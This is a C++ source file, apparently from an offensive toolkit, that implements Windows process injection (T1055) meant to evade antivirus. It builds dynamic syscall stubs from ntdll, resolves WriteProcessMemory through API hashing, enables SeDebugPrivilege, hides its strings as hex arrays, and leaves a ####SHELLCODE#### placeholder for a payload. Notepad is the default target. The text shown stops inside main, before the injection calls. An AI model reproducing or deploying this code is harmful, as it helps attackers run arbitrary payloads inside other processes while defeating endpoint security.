#include "sweet_sleep.h"
/**
Author: Thomas X Meng
T1055 Process Injection
Sifu syscall Process Injection code. 
**/
/***
 * To break both the heuristic and behavioural detection of AVs, we can use the following techniques:
 * To load the VirtualAlloc and CreateRemoteThread and CloseHandle functions using dynamic syscall stubs
 * but load the WriteProcessMemory using API hashing, thus bypassing the heuristic detection of AVs that detecting 
 * both techniques (dynamic syscall stubs and API hashing) at the same time. To satisfy the conventional PE injection rules,
 *  The three stages of PE injection need to be observed in sequence.  
 * Sub-techniques: Devide and conquer, reference: 
 * https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd
*/
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstring>
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif



typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
const int SYSCALL_STUB_SIZE = 23; // How arch depend are syscall stubs? 

// Define function pointers for the dynamic syscalls
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);

// Define prototype for the API hashing function
using customWriteProcessMemory = BOOL(WINAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);


PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	
	const char  mxt_9999Ad_S_i6nsUKmCBZPomO6enu[] = {'\x5b','\x2b','\x5d','\x20','\x41','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x6f','\x66','\x20','\x25','\x73','\x20','\x69','\x6e','\x20','\x6d','\x61','\x6e','\x75','\x61','\x6c','\x20','\x6c','\x6f','\x61','\x64','\x65','\x64','\x20','\x6e','\x74','\x64','\x6c','\x6c','\x20','\x65','\x78','\x70','\x6f','\x72','\x74','\x20','\x74','\x61','\x62','\x6c','\x65','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Ad_S_i6nsUKmCBZPomO6enu");

	const char  mxt_9999Sy_R_Pb3G_md3o9Ljfc6enu[] = {'\x5b','\x2b','\x5d','\x20','\x53','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x66','\x6f','\x72','\x20','\x25','\x73','\x20','\x66','\x6f','\x75','\x6e','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Sy_R_Pb3G_md3o9Ljfc6enu");

	const char  mxt_9999Sy_S_N1AFz1Kj7hOqV6henu[] = {'\x5b','\x2b','\x5d','\x20','\x53','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x62','\x79','\x74','\x65','\x73','\x3a','\x20',0};
	OutputDebugStringA("mxt_9999Sy_S_N1AFz1Kj7hOqV6henu");

	const char  mxt_9999Sy_M_PZEkAIQ8lBFi_KSenu[] = {'\x5b','\x2d','\x5d','\x20','\x53','\x79','\x73','\x63','\x61','\x6c','\x6c','\x20','\x73','\x74','\x75','\x62','\x20','\x66','\x6f','\x72','\x20','\x25','\x73','\x20','\x6e','\x6f','\x74','\x20','\x66','\x6f','\x75','\x6e','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Sy_M_PZEkAIQ8lBFi_KSenu");
PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
            printf(mxt_9999Ad_S_i6nsUKmCBZPomO6enu, functionName, (void*)functionVA);
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
			printf(mxt_9999Sy_R_Pb3G_md3o9Ljfc6enu, functionName);
            // Print the syscall stub bytes
            printf(mxt_9999Sy_S_N1AFz1Kj7hOqV6henu);
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf(mxt_9999Sy_M_PZEkAIQ8lBFi_KSenu, functionName);
	}
	return stubFound;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    
	const wchar_t  mxt_999999_S_eEE9gi5kdNhUOWYenu[] = {'\x20','\x5b','\x2b','\x5d','\x20','\x45','\x6e','\x61','\x62','\x6c','\x65','\x20','\x25','\x6c','\x73','\x20','\x61','\x64','\x65','\x71','\x75','\x61','\x74','\x65','\x20','\x70','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65','\n',0};
	OutputDebugStringA("mxt_999999_S_eEE9gi5kdNhUOWYenu");

	const wchar_t  mxt_999999_M_bSYGI6bmVJ5vSi9enu[] = {'\x20','\x5b','\x2b','\x5d','\x20','\x53','\x75','\x63','\x63','\x65','\x73','\x73','\n',0};
	OutputDebugStringA("mxt_999999_M_bSYGI6bmVJ5vSi9enu");

	const wchar_t  mxt_999999_S_0f88y6kkn7pWSXnenu[] = {'\x20','\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x75','\x72','\x65','\n',0};
	OutputDebugStringA("mxt_999999_S_0f88y6kkn7pWSXnenu");
HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(mxt_999999_S_eEE9gi5kdNhUOWYenu, Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(mxt_999999_M_bSYGI6bmVJ5vSi9enu);
    else
        wprintf(mxt_999999_S_0f88y6kkn7pWSXnenu);

    return ret;
}

BOOL IsSystem64Bit() {
    
	const char  mxt_kernel_R_eJcch6gmDndl8Uaenu[] = {'\x6b','\x65','\x72','\x6e','\x65','\x6c','\x33','\x32','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_kernel_R_eJcch6gmDndl8Uaenu");

	const char  mxt_GetNat_M_rcYhjPh9j5E9rz7enu[] = {'\x47','\x65','\x74','\x4e','\x61','\x74','\x69','\x76','\x65','\x53','\x79','\x73','\x74','\x65','\x6d','\x49','\x6e','\x66','\x6f',0};
	OutputDebugStringA("mxt_GetNat_M_rcYhjPh9j5E9rz7enu");
HMODULE hKernel32 = LoadLibraryA(mxt_kernel_R_eJcch6gmDndl8Uaenu);
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, mxt_GetNat_M_rcYhjPh9j5E9rz7enu);
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

class CityHash {
public:
    uint64_t CityHash64(const char *buf, size_t len) {
        if (len <= 32) {
            if (len <= 16) {
                return HashLen0to16(buf, len);
            } else {
                return HashLen17to32(buf, len);
            }
        } else if (len <= 64) {
            return HashLen33to64(buf, len);
        }

        // For strings over 64 characters, CityHash uses a more complex algorithm
        // which is too lengthy to implement here. The official CityHash
        // implementation should be used for such cases.

        // Simplified version for longer strings:
        uint64_t hash = 0;
        for (size_t i = 0; i < len; ++i) {
            hash = hash * 33 + buf[i];
        }
        return hash;
    }

private:
    uint64_t HashLen0to16(const char* s, size_t len) {
        // Simplified hashing for short strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 33 + s[i];
        }
        return (a << 1) ^ b;
    }

    uint64_t HashLen17to32(const char* s, size_t len) {
        // Simplified hashing for medium strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 29 + s[i];
        }
        return (a << 2) ^ b;
    }

    uint64_t HashLen33to64(const char* s, size_t len) {
        // Simplified hashing for larger strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 37 + s[i];
            b = b * 39 + s[i];
        }
        return (a << 3) ^ b;
    }
};

CityHash cityHasher;

uint64_t getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    // Using CityHash to compute the hash
    return cityHasher.CityHash64(string, stringLength);
}

// class SimpleMurmurHash3 {
// public:
//     uint32_t computeHash32(const char* data, size_t len, uint32_t seed = 0) {
//         uint32_t hash = seed;
//         const uint32_t c1 = 0xcc9e2d51;
//         const uint32_t c2 = 0x1b873593;

//         const int nblocks = len / 4;
//         const uint32_t* blocks = (const uint32_t*)(data);
//         for (int i = 0; i < nblocks; i++) {
//             uint32_t k = blocks[i];
//             k *= c1;
//             k = rotl32(k, 15);
//             k *= c2;
            
//             hash ^= k;
//             hash = rotl32(hash, 13); 
//             hash = hash * 5 + 0xe6546b64;
//         }

//         const uint8_t* tail = (const uint8_t*)(data + nblocks * 4);
//         uint32_t k1 = 0;
//         switch (len & 3) {
//             case 3: k1 ^= tail[2] << 16;
//             case 2: k1 ^= tail[1] << 8;
//             case 1: k1 ^= tail[0];
//                     k1 *= c1; k1 = rotl32(k1, 15); k1 *= c2; hash ^= k1;
//         };

//         hash ^= len;
//         hash = fmix32(hash);

//         return hash;
//     }

// private:
//     static uint32_t rotl32(uint32_t x, int8_t r) {
//         return (x << r) | (x >> (32 - r));
//     }

//     static uint32_t fmix32(uint32_t h) {
//         h ^= h >> 16;
//         h *= 0x85ebca6b;
//         h ^= h >> 13;
//         h *= 0xc2b2ae35;
//         h ^= h >> 16;
//         return h;
//     }
// };


// SimpleMurmurHash3 hasher;
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash32(string, stringLength);
// }

// DWORD getHashFromString(char *string)
// {
//     size_t stringLength = strnlen_s(string, 50);
//     DWORD hash = 0x35;

//     for (size_t i = 0; i < stringLength; i++)
//     {
//         hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
//     }
//     // printf("%s: 0x00%x\n", string, hash);

//     return hash;
// }

// FNV-1a hash: This implementation uses a variant of the FNV-1a hash algorithm, 
//which is known for its simplicity and relatively good distribution properties. 
//The constants 0x811c9dc5 and 0x1000193 are parameters of the FNV-1a algorithm.

//This hash function is straightforward, yet it should provide a better balance between simplicity and effectiveness

//32-bit FNV-1a hash
// Improve the distribution and collision resistance of the hash values
// class ImprovedHash {
// public:
//     uint32_t computeHash(const char* input, size_t length) {
//         uint32_t hash = 0x811c9dc5;
//         uint32_t prime = 0x1000193;

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization step to improve distribution
//         hash ^= hash >> 16;
//         hash *= 0x85ebca6b;
//         hash ^= hash >> 13;
//         hash *= 0xc2b2ae35;
//         hash ^= hash >> 16;

//         return hash;
//     }
// };

//64-bit FNV-1a hash
// class ImprovedHash {
// public:
//     uint64_t computeHash(const char* input, size_t length) {
//         uint64_t hash = 0xcbf29ce484222325; // 64-bit initial value, FNV_offset_basis
//         uint64_t prime = 0x100000001b3;     // 64-bit prime, FNV_prime value

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization steps
//         hash ^= hash >> 33;
//         hash *= 0xff51afd7ed558ccd;
//         hash ^= hash >> 33;
//         hash *= 0xc4ceb9fe1a85ec53;
//         hash ^= hash >> 33;

//         return hash;
//     }
// };

// // Replace the original getHashFromString with this new implementation
// ImprovedHash hasher;
// // DWORD getHashFromString(char *string) {
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash(string, stringLength);
// }

PDWORD getFunctionAddressByHash(char *library, DWORD hash)
{
	
	const char  mxt_9999fu_M_Criia8BvuICXhRzenu[] = {'\x5b','\x2a','\x5d','\x20','\x66','\x75','\x6e','\x63','\x74','\x69','\x6f','\x6e','\x20','\x6e','\x61','\x6d','\x65','\x3a','\x25','\x73','\x20','\x68','\x61','\x73','\x68','\x3a','\x20','\x30','\x78','\x25','\x78','\x20','\x52','\x56','\x41','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999fu_M_Criia8BvuICXhRzenu");
PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	
	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);
		
		// If hash for API function is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			printf(mxt_9999fu_M_Criia8BvuICXhRzenu, functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}



unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[]) {


    
	const char  mxt_kernel_M_rDMJrryPEIdpb07enu[] = {'\x6b','\x65','\x72','\x6e','\x65','\x6c','\x33','\x32','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_kernel_M_rDMJrryPEIdpb07enu");

	const char  mxt_9999Fa_M_MnGO38d8k9J1cuPenu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x6c','\x6f','\x61','\x64','\x20','\x6b','\x65','\x72','\x6e','\x65','\x6c','\x33','\x32','\x2e','\x64','\x6c','\x6c','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_M_MnGO38d8k9J1cuPenu");

	const char  mxt_ntdll9_M_sLasFROcK04ZQ3nenu[] = {'\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_ntdll9_M_sLasFROcK04ZQ3nenu");

	const char  mxt_9999Fa_S_d5axICHXg5PaSgEenu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x6c','\x6f','\x61','\x64','\x20','\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_S_d5axICHXg5PaSgEenu");

	const char  mxt_GetLas_M_WAL01TefMc0sPelenu[] = {'\x47','\x65','\x74','\x4c','\x61','\x73','\x74','\x45','\x72','\x72','\x6f','\x72',0};
	OutputDebugStringA("mxt_GetLas_M_WAL01TefMc0sPelenu");

	const wchar_t  mxt_S9e9D9_R_XHCA7SqkAGvGoU4enu[] = {'\x53','\x65','\x44','\x65','\x62','\x75','\x67','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
	OutputDebugStringA("mxt_S9e9D9_R_XHCA7SqkAGvGoU4enu");

	const char  mxt_999Fai_R_8qtukBFZMLk9Rmhenu[] = {'\x5b','\x2d','\x5d','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x65','\x6e','\x61','\x62','\x6c','\x65','\x20','\x53','\x65','\x44','\x65','\x62','\x75','\x67','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65','\x2e','\x20','\x59','\x6f','\x75','\x20','\x6d','\x69','\x67','\x68','\x74','\x20','\x6e','\x6f','\x74','\x20','\x68','\x61','\x76','\x65','\x20','\x73','\x75','\x66','\x66','\x69','\x63','\x69','\x65','\x6e','\x74','\x20','\x70','\x65','\x72','\x6d','\x69','\x73','\x73','\x69','\x6f','\x6e','\x73','\x2e','\n',0};
	OutputDebugStringA("mxt_999Fai_R_8qtukBFZMLk9Rmhenu");

	const char  mxt_Invali_S_jbufc3mc7HcCUYhenu[] = {'\x49','\x6e','\x76','\x61','\x6c','\x69','\x64','\x20','\x73','\x74','\x65','\x70','\x20','\x76','\x61','\x6c','\x75','\x65','\x3a','\x20','\x25','\x64','\x2e','\x20','\x56','\x61','\x6c','\x69','\x64','\x20','\x76','\x61','\x6c','\x75','\x65','\x73','\x20','\x61','\x72','\x65','\x20','\x31','\x2c','\x20','\x32','\x2c','\x20','\x6f','\x72','\x20','\x33','\x2e','\x20','\x44','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x61','\x63','\x74','\x69','\x6f','\x6e','\x20','\x77','\x69','\x6c','\x6c','\x20','\x62','\x65','\x20','\x74','\x61','\x6b','\x65','\x6e','\x2e','\n',0};
	OutputDebugStringA("mxt_Invali_S_jbufc3mc7HcCUYhenu");

	const char  mxt_9buffe_M_I6VRIyJ8PUmLtCRenu[] = {'\x2d','\x62','\x75','\x66','\x66','\x65','\x72',0};
	OutputDebugStringA("mxt_9buffe_M_I6VRIyJ8PUmLtCRenu");

	const char  mxt_Invali_M_yF5wXH5qw_irymPenu[] = {'\x49','\x6e','\x76','\x61','\x6c','\x69','\x64','\x20','\x62','\x75','\x66','\x66','\x65','\x72','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x2e','\x20','\x45','\x6e','\x73','\x75','\x72','\x65','\x20','\x69','\x74','\x20','\x69','\x73','\x20','\x61','\x20','\x76','\x61','\x6c','\x69','\x64','\x20','\x70','\x6f','\x69','\x6e','\x74','\x65','\x72','\x20','\x76','\x61','\x6c','\x75','\x65','\x2e','\n',0};
	OutputDebugStringA("mxt_Invali_M_yF5wXH5qw_irymPenu");

	const char  mxt_Usage9_R_sTXITzQg_onkO6senu[] = {'\x55','\x73','\x61','\x67','\x65','\x3a','\x20','\x25','\x73','\x20','\x2d','\x70','\x69','\x64','\x20','\x3c','\x50','\x49','\x44','\x3e','\x20','\x2d','\x73','\x74','\x65','\x70','\x20','\x3c','\x31','\x7c','\x32','\x7c','\x33','\x3e','\x20','\x2d','\x62','\x75','\x66','\x66','\x65','\x72','\x20','\x3c','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x3e','\n','\x20','\x69','\x66','\x20','\x6e','\x6f','\x20','\x61','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x20','\x73','\x75','\x70','\x70','\x6c','\x69','\x65','\x64','\x2c','\x20','\x72','\x75','\x6e','\x20','\x69','\x6e','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6d','\x6f','\x64','\x65','\n',0};
	OutputDebugStringA("mxt_Usage9_R_sTXITzQg_onkO6senu");

	const char  mxt_Runnin_M_CCdqkDjJh4N_Fxsenu[] = {'\x52','\x75','\x6e','\x6e','\x69','\x6e','\x67','\x20','\x77','\x69','\x74','\x68','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6e','\x6f','\x74','\x65','\x70','\x61','\x64','\x20','\x64','\x75','\x65','\x20','\x74','\x6f','\x20','\x69','\x6e','\x73','\x75','\x66','\x66','\x69','\x63','\x69','\x65','\x6e','\x74','\x20','\x70','\x61','\x72','\x61','\x6d','\x65','\x74','\x65','\x72','\x73','\x2e','\n',0};
	OutputDebugStringA("mxt_Runnin_M_CCdqkDjJh4N_Fxsenu");

	const char  mxt_C99Win_S_2gkb_vCOJKqeBcaenu[] = {'\x43','\x3a','\\','\x57','\x69','\x6e','\x64','\x6f','\x77','\x73','\\','\x53','\x79','\x73','\x74','\x65','\x6d','\x33','\x32','\\','\x6e','\x6f','\x74','\x65','\x70','\x61','\x64','\x2e','\x65','\x78','\x65',0};
	OutputDebugStringA("mxt_C99Win_S_2gkb_vCOJKqeBcaenu");

	const char  mxt_C99Win_S_XLPyLFmhk_1hEGhenu[] = {'\x43','\x3a','\\','\x57','\x69','\x6e','\x64','\x6f','\x77','\x73','\\','\x53','\x79','\x73','\x57','\x4f','\x57','\x36','\x34','\\','\x6e','\x6f','\x74','\x65','\x70','\x61','\x64','\x2e','\x65','\x78','\x65',0};
	OutputDebugStringA("mxt_C99Win_S_XLPyLFmhk_1hEGhenu");

	const char  mxt_Notepa_M_LiZle1ddEqPRaJuenu[] = {'\x4e','\x6f','\x74','\x65','\x70','\x61','\x64','\x20','\x73','\x74','\x61','\x72','\x74','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x73','\x65','\x74','\x74','\x69','\x6e','\x67','\x73','\x2e','\n',0};
	OutputDebugStringA("mxt_Notepa_M_LiZle1ddEqPRaJuenu");

	const char  mxt_PID9pr_R_YhBY7yy2jFtT513enu[] = {'\x50','\x49','\x44','\x20','\x70','\x72','\x6f','\x76','\x69','\x64','\x65','\x64','\x20','\x77','\x69','\x74','\x68','\x6f','\x75','\x74','\x20','\x2d','\x73','\x74','\x65','\x70','\x20','\x61','\x6e','\x64','\x20','\x2d','\x62','\x75','\x66','\x66','\x65','\x72','\x2e','\x20','\x50','\x72','\x6f','\x63','\x65','\x65','\x64','\x69','\x6e','\x67','\x20','\x77','\x69','\x74','\x68','\x20','\x50','\x49','\x44','\x3a','\x20','\x25','\x6c','\x75','\n',0};
	OutputDebugStringA("mxt_PID9pr_R_YhBY7yy2jFtT513enu");

	const char  mxt_PID999_R_AZXi58qWl7cDmnaenu[] = {'\x50','\x49','\x44','\x3a','\x20','\x25','\x6c','\x75','\x2c','\x20','\x53','\x74','\x65','\x70','\x3a','\x20','\x25','\x64','\x2c','\x20','\x42','\x75','\x66','\x66','\x65','\x72','\x20','\x41','\x64','\x64','\x72','\x65','\x73','\x73','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_PID999_R_AZXi58qWl7cDmnaenu");

	const char  mxt_999tar_M_hGHiQoY0cUr5VXzenu[] = {'\x5b','\x2a','\x5d','\x74','\x61','\x72','\x67','\x65','\x74','\x20','\x70','\x72','\x6f','\x63','\x65','\x73','\x73','\x20','\x50','\x49','\x44','\x3a','\x20','\x25','\x64','\n',0};
	OutputDebugStringA("mxt_999tar_M_hGHiQoY0cUr5VXzenu");

	const char  mxt_ntdll9_M_t0lUaqemo8j_Wr8enu[] = {'\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_ntdll9_M_t0lUaqemo8j_Wr8enu");

	const char  mxt_9999Fa_S_IMwtEZG6Xq7xcchenu[] = {'\x5b','\x2d','\x5d','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x67','\x65','\x74','\x20','\x68','\x61','\x6e','\x64','\x6c','\x65','\x20','\x6f','\x66','\x20','\x74','\x68','\x65','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6c','\x6f','\x61','\x64','\x65','\x64','\x20','\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c','\x2e','\n',0};
	OutputDebugStringA("mxt_9999Fa_S_IMwtEZG6Xq7xcchenu");

	const char  mxt_9999Me_M_tiG8SKrRWiCEdUaenu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x61','\x64','\x64','\x72','\x65','\x73','\x73','\x20','\x6f','\x66','\x20','\x74','\x68','\x65','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x6c','\x6f','\x61','\x64','\x65','\x64','\x20','\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_M_tiG8SKrRWiCEdUaenu");

	const char  mxt_c99win_R_4JfseMvUYlFmPf6enu[] = {'\x63','\x3a','\\','\x77','\x69','\x6e','\x64','\x6f','\x77','\x73','\\','\x73','\x79','\x73','\x74','\x65','\x6d','\x33','\x32','\\','\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c',0};
	OutputDebugStringA("mxt_c99win_R_4JfseMvUYlFmPf6enu");

	const char  mxt_9999Me_S_nsCNYdRFOKjBTN3enu[] = {'\x5b','\x2b','\x5d','\x20','\x4d','\x65','\x6d','\x6f','\x72','\x79','\x20','\x6c','\x6f','\x63','\x61','\x74','\x69','\x6f','\x6e','\x20','\x6f','\x66','\x20','\x6c','\x6f','\x61','\x64','\x65','\x64','\x20','\x6e','\x74','\x64','\x6c','\x6c','\x2e','\x64','\x6c','\x6c','\x3a','\x20','\x25','\x70','\n',0};
	OutputDebugStringA("mxt_9999Me_S_nsCNYdRFOKjBTN3enu");

	const char  mxt_9rdata_M_u9gYijxyHeBHWXfenu[] = {'\x2e','\x72','\x64','\x61','\x74','\x61',0};
	OutputDebugStringA("mxt_9rdata_M_u9gYijxyHeBHWXfenu");

	const char  mxt_99999r_S_rrb00M7iRGRq457enu[] = {'\x5b','\x2b','\x5d','\x20','\x2e','\x72','\x64','\x61','\x74','\x61','\x20','\x73','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x66','\x6f','\x75','\x6e','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_99999r_S_rrb00M7iRGRq457enu");

	const char  mxt_99999r_S_7yJ2lF9mIqhfALnenu[] = {'\x5b','\x2d','\x5d','\x20','\x2e','\x72','\x64','\x61','\x74','\x61','\x20','\x73','\x65','\x63','\x74','\x69','\x6f','\x6e','\x20','\x6e','\x6f','\x74','\x20','\x66','\x6f','\x75','\x6e','\x64','\x2e','\n',0};
	OutputDebugStringA("mxt_99999r_S_7yJ2lF9mIqhfALnenu");

	const char  mxt_NtOpen_S_3Fhp5RgZYpZcDWHenu[] = {'\x4e','\x74','\x4f','\x70','\x65','\x6e','\x50','\x72','\x6f','\x63','\x65','\x73','\x73',0};
	OutputDebugStringA("mxt_NtOpen_S_3Fhp5RgZYpZcDWHenu");

